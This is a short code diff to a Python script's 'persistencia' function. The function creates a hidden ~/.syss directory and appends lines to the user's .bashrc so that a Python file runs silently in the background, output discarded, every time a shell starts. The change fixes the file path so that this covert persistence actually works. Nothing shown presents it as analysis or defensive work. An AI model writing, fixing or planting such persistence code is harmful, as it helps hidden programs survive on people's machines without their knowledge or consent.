@@ -33,7 +33,7 @@ def persistencia():
   os.system("mkdir $HOME/.syss")
   mypwd = os.popen("echo $HOME/.syss").read()[:-1]
   os.system("echo 'myloc=\"{}\"' >> $HOME/.bashrc".format(mypwd))
-  os.system("echo 'python {} </dev/null &>/dev/null &' >> $HOME/.bashrc".format(mypwd+myname))
+  os.system("echo 'python {} </dev/null &>/dev/null &' >> $HOME/.bashrc".format(mypwd+"/"+myname))
 
 def ifnotbashrc():
   home = os.popen("echo $HOME").read()[:-1]
